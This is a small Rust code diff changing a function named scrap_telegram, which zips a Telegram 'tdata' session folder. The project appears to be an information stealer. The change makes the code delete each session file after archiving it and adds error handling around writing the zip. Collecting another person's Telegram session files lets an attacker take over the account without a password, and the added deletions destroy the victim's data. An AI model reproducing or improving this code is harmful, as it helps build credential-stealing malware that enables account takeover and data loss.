@@ -54,9 +54,12 @@ pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, loca
                 Ok(_) => {}
                 Err(_) => {return Err("Telegram zip writing error");}
             };
+            let _ = fs::remove_file(entry_path);
         }
     }
-    zip_file.finish().unwrap();
-    let _ = fs::remove_dir_all(&tdata_path);
+    match zip_file.finish(){
+        Ok(_) => {}
+        Err(_) => {return Err("Error writing zip file")}
+    }
     return Ok(());
 }
